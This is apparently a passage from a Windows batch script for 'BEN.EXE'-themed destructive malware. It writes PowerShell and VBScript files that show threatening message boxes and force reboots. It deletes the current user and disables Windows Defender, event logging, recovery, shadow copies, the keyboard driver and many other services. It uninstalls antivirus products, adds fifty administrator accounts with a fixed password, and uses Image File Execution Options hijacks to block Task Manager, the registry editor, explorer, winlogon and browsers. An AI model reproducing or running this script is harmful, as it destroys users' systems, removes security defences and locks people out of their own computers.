echo             Start-Sleep 43 >> Benexe.ps1
echo             Invoke-Expression "shutdown -r -t 6 -c 'You faced a terrible fate, didn''t you?'" >> Benexe.ps1
echo             $bgImagePath = "$env:APPDATA\ren\nomalben.png"                                                                 >> Benexe.ps1
echo             $bgImage = [System.Drawing.Image]::FromFile($bgImagePath)                                                      >> Benexe.ps1
echo             $form.BackgroundImage = $bgImage                                                                               >> Benexe.ps1
echo             $form.Refresh()                                                                                                >> Benexe.ps1
echo        ^ } else {                                                                                                           >> Benexe.ps1
echo             $global:input = ""                                                                                             >> Benexe.ps1
echo        ^ }                                                                                                                  >> Benexe.ps1
echo   ^  } else {                                                                                                               >> Benexe.ps1
echo         $global:input = ""                                                                                                 >> Benexe.ps1
echo     ^}                                                                                                                      >> Benexe.ps1
echo ^})                                                                                                                         >> Benexe.ps1
echo # 폼 보여주기                                                                                                                   >> Benexe.ps1
echo $form.ShowDialog()                                                                                                         >> Benexe.ps1
echo # 키보드 입력 감지 함수 정의                                                                                                          >> Benexe.ps1
echo function Check-Input^ {                                                                                                     >> Benexe.ps1
echo     while($true)^ {                                                                                                         >> Benexe.ps1
echo         $null = [System.Windows.Forms.Application]::DoEvents()                                                             >> Benexe.ps1
echo         if(!$form.Visible)^ {                                                                                               >> Benexe.ps1
echo             break                                                                                                          >> Benexe.ps1
echo        ^ }                                                                                                                  >> Benexe.ps1
echo    ^ }                                                                                                                      >> Benexe.ps1
echo ^}                                                                                                                          >> Benexe.ps1
echo ^$shell = New-Object -ComObject "Shell.Application" > changreset.ps1
echo ^$shell.ToggleDesktop() >> changreset.ps1
echo Dim oShell > ERROR1.vbs
echo Set oShell = WScript.CreateObject ("WSCript.shell") >> ERROR1.vbs
echo MsgBox "Hello, do you remember me?", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "Yes i am your friend BEN.EXE! , I am come back!", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "You opened me up again!", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "You let me in again!", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "You Shouldn't Do That", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "Oh, I'll give you some advice", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "You'd better not turn off the computer", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "If the computer is turned off.", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "YOUR COMPUTER IS DIED", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "The computer will be mine forever.", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "I won't let you run away this time", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo MsgBox "HAHAHAHAHAHAHAHAHAHA", vbCritical, "BEN.EXE" >> ERROR1.vbs
echo oShell.Run "%appdata%\ren\BL.bat" >> ERROR1.vbs
echo oShell.Run "%appdata%\ren\Benan.bat" >> ERROR1.vbs 
start /min ERROR1.vbs
start /min benben14.bat
REG ADD "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
REG ADD "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v "NoChangingWallPaper" /t REG_DWORD /d 1 /f
net user %Username% /delete
PowerShell.exe -Command "Set-ExecutionPolicy Unrestricted -Force"
bcdedit /set {globalsettings} advancedoptions false
sc config Browser start= disabled
net stop Browser /y
sc config Dhcp start= disabled
net stop Dhcp /y
sc config TabletInputService start= disabled
sc config WinDefend start= disabled
sc config SysMain start= disabled
sc config DiagTrack start= disabled
sc config EventLog start= disabled
sc config wuauserv start= disabled
sc config WbioSrvc start= disabled
sc config TermService start= disabled
sc config PhoneSvc start= disabled
sc config WerSvc start= disabled
sc config WMPNetworkSvc start= disabled
sc config UsoSvc start= disabled
sc config FontCache start= disabled
sc config Eventlog start= disabled
sc config WSearch start= disabled
sc config w32time start= disabled
sc stop EventLog
sc config FontCache start= disabled
sc config stisvc start= disabled
sc stop stisvc
sc stop msiserver
sc config WbioSrvc start= disabled
sc stop WbioSrvc
sc config VSS start= disabled
sc stop VSS
sc config AxInstSV start= disabled
sc config AarSvc_5b8f3 start= disabled
sc stop AarSvc_5b8f3
sc config AJRouter start= disabled
sc stop AJRouter
sc config AppReadiness start= disabled
sc stop AppReadiness
sc config AppIDSvc start= disabled
sc stop AppIDSvc
sc config Appinfo start= disabled
sc config WinRM start= disabled
sc stop WinRM
sc config DPS start= disabled
sc stop DPS
sc config WerSvc start= disabled
sc config Spooler start= disabled
sc stop Spooler
sc config bthserv start= disabled
sc stop bthserv
sc config SDRSVC start=disabled > nul
sc config WMPNetworkSvc start=disabled > nul
sc config ehRecvr start=disabled > nul
sc config WerSvc start=disabled > nul
sc config eventlog start=disabled > nul
sc config WerSvc start=disabled > nul
sc config ehRecvr start=disabled > nul
sc config ehstart start=disabled > nul
sc config WMPNetworkSvc start=disabled > nul
sc config w32time start=disabled > nul
reagentc /disable > nul
sc config WinRM start=disabled > nul

md c:\recovery\windowsre
wmic path win32_service where "name='WerSvc'" call changeStartmode Disabled > nul
sc stop WerSvc > nul
wmic path win32_service where "name='WSearch'" call changeStartmode Disabled > nul
sc stop WSearch > nul
wmic path win32_service where "name='TermService'" call changeStartmode Disabled > nul
sc stop TermService > nul
wmic path win32_service where "name='RasAuto'" call changeStartmode Disabled > nul
wmic path win32_service where "name='RasMan'" call changeStartmode Disabled > nul
sc stop RasAuto > nul
sc stop RasMan > nul
wmic path win32_service where "name='RemoteRegistry'" call changeStartmode Disabled > nul
sc stop RemoteRegistry > nul
wmic path win32_service where "name='WinRS'" call changeStartmode Disabled > nul
sc stop WinRS > nul
wmic path win32_service where "name='Spooler'" call changeStartmode Disabled > nul
sc stop Spooler > nul
wmic path win32_service where "name='WinRM'" call changeStartmode Disabled > nul
setlocal enabledelayedexpansion
net user Administrator /active:no && net user Guest /active:yes
net %username% /delete
set old_username=%username%
set new_username="ANOUNYMOUSNAKE"
net user "%old_username%" /fullname:%new_username% && wmic useraccount where name="%old_username%" call rename name="%new_username%"
set "password=AlISVI12l34UZNKB@YBHKgI@elICQlIlXBsSNMke3cBjILLililILIIII"
for /l %%i in (1, 1, 50) do (
  set "username=Anonymoussnake%%i"
  net user !username! !password! /add /y
  net localgroup administrators !username! /add
)
wmic path win32_service where "name='wwansvc'" call changeStartmode Disabled > nul
sc stop wwansvc > nul
recimg -CreateImage c:\recovery\windowsre\install.wim
reagentc /setreimage /path c:\recovery\windowsre /target c:\windows
reagentc /disable
wmic product where "Name like 'Antivirus%'" call uninstall /nointeractive
wmic product where "Name like 'Security%'" call uninstall /nointeractive
powercfg -CHANGE -monitor-timeout-ac 0
powercfg -CHANGE -standby-timeout-ac 0
powercfg -CHANGE -hibernate-timeout-ac 0
powercfg -CHANGE -monitor-timeout-dc 0
powercfg -CHANGE -standby-timeout-dc 0
powercfg -CHANGE -hibernate-timeout-dc 0
powercfg -CHANGE -disk-timeout-ac 0
powercfg -CHANGE -disk-timeout-dc 0
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoProblemReports /t REG_DWORD /d 1 /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\KeysNotToRestore" /v "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems\Windows" /t REG_MULTI_SZ /d "Anonymoussnake" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\KeysNotToRestore" /v "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SubSystems" /t REG_MULTI_SZ /d "" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryEnvironment" /v "CommandPromptFontColor" /t REG_DWORD /d "0xff00ff" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartScheduledMaintenance" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartWithLoggedOnUsers" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutoRebootOnCrash" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v "CrashDumpEnabled" /t REG_DWORD /d "0" /f
echo corc corc corc... > C:\Windows\System32\LogFiles\Srt\SrtTrail.txt
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TabTip.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "%windir%\System32\systray.exe" /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v "Start" /t REG_DWORD /d "4" /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d 1 /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d 1 /f
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d 1 /f
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "taskkill.exe /f /im msedge.exe" /f
reg add "HKLMc\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im regedit.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "taskkill /f /im chrome.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "taskkill /f /im control.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "taskkill /f /im powershell_ise.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winload.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winload.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\discord.exe" /v Debugger /t REG_SZ /d "taskkill /f /im discord.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\win32k.sys" /v Debugger /t REG_SZ /d "taskkill /f /im win32k.sys" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\user32.dll" /v Debugger /t REG_SZ /d "taskkill /f /im user32.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winload.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winload.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntoskrnl.exe" /v Debugger /t REG_SZ /d "taskkill /f /im ntoskrnl.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kernel32.dll" /v Debugger /t REG_SZ /d "taskkill /f /im kernel32.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cleanmgr.exe" /v Debugger /t REG_SZ /d "taskkill /f /im cleanmgr.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\systray.exe" /v Debugger /t REG_SZ /d "taskkill /f /im systray.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\compmgmt.msc" /v Debugger /t REG_SZ /d "taskkill /f /im compmgmt.msc" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "taskkill /f /im notepad.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\diskmgmt.msc" /v Debugger /t REG_SZ /d "taskkill /f /im diskmgmt.msc" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" /v Debugger /t REG_SZ /d "taskkill /f /im mspaint.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchFilterHost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SearchFilterHost.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SearchFolder.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SearchFolder.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im rundll32.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mstsc.exe" /v Debugger /t REG_SZ /d "taskkill /f /im mstsc.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\System.evtx" /v Debugger /t REG_SZ /d "taskkill /f /im System.evtx" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpd_ci.dll" /v Debugger /t REG_SZ /d "taskkill /f /im wpd_ci.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntkrnlpa.exe" /v Debugger /t REG_SZ /d "taskkill /f /im ntkrnlpa.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SecEdit.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SecEdit.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdkey.exe" /v Debugger /t REG_SZ /d "taskkill /f /im cmdkey.exe" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\partmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im partmgr.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\disk.sys" /v Debugger /t REG_SZ /d "taskkill /f /im disk.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atapi.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atapi.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im pci.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msisadrv.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msisadrv.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WUDFHost.exe" /v Debugger /t REG_SZ /d "taskkill /f /im WUDFHost.exe" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Security.evtx" /v Debugger /t REG_SZ /d "taskkill /f /im Security.evtx" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemResetPlatform.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemResetPlatform.exe" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpdcomp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im wpdcomp.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wpdusb.sys" /v Debugger /t REG_SZ /d "taskkill /f /im wpdusb.sys" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clrjit.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clrjit.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clretwrc.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clretwrc.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clr.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clr.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clrcompression.dll" /v Debugger /t REG_SZ /d "taskkill /f /im clrcompression.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mscorwks.dll" /v Debugger /t REG_SZ /d "taskkill /f /im mscorwks.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wuaueng.dll" /v Debugger /t REG_SZ /d "taskkill /f /im wuaueng.dll" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bootvid.dll" /v Debugger /t REG_SZ /d "taskkill /f /im bootvid.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kdcom.dll" /v Debugger /t REG_SZ /d "taskkill /f /im kdcom.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Ntfs.sys" /v Debugger /t REG_SZ /d "taskkill /f /im Ntfs.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ndis.sys" /v Debugger /t REG_SZ /d "taskkill /f /im ndis.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\partmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im partmgr.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgr.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\volmgrx.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgrx.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msrpc.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msrpc.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fs_rec.sys" /v Debugger /t REG_SZ /d "taskkill /f /im fs_rec.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbport.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbport.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbehci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbehci.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\acpi.sys" /v Debugger /t REG_SZ /d "taskkill /f /im acpi.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im pci.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbuhci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im usbuhci.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fastfat.sys" /v Debugger /t REG_SZ /d "taskkill /f /im fastfat.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msrpc.sys" /v Debugger /t REG_SZ /d "taskkill /f /im msrpc.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\usbuhci.sys" /v Debugger /t REG_SZ /d "taskkill /f /im volmgr.sys" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ReAgent.xml" /v Debugger /t REG_SZ /d "taskkill /f /im ReAgent.xml" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "taskkill /f /im winlogon.exe" /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v DisableAutomaticRebootOnCrash /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Recovery /v IgnoreAutoRecoveryEnabled /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN" /v CheckedValue /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v SpecialPollInterval /t REG_DWORD /d 86400 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v NoGenTicket /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "%windir%\system32\taskkill.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\takeown.exe" /v Debugger /t REG_SZ /d "taskkill /f /im takeown.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettings.DataModel.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettings.DataModel.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\systeminfo.exe" /v Debugger /t REG_SZ /d "taskkill /f /im systeminfo.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettings.UserAccountsHandlers.dll" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettings.UserAccountsHandlers.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemUWPLauncher.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemUWPLauncher.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettingsRemoveDevice.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettingsRemoveDevice.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SystemSettingsAdminFlows.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SystemSettingsAdminFlows.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msinfo32.exe" /v Debugger /t REG_SZ /d "taskkill /f /im msinfo32.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SnippingTool.exe" /v Debugger /t REG_SZ /d "taskkill /f /im SnippingTool.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\coredpussvr.exe" /v Debugger /t REG_SZ /d "taskkill /f /im coredpussvr.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\runonce.exe" /v Debugger /t REG_SZ /d "taskkill /f /im runonce.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdext.dll" /v Debugger /t REG_SZ /d "taskkill /f /im cmdext.dll" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RuntimeBroker.exe" /v Debugger /t REG_SZ /d "taskkill /f /im RuntimeBroker.exe" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hal.dll" /v Debugger /t REG_SZ /d "taskkill /f /im hal.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tcpip.sys" /v Debugger /t REG_SZ /d "taskkill /f /im tcpip.sys" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atikmdag.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atikmdag.sys" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\classpnp.sys" /v Debugger /t REG_SZ /d "taskkill /f /im classpnp.sys" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atikmdag.sys" /v Debugger /t REG_SZ /d "taskkill /f /im atikmdag.sys" /f 
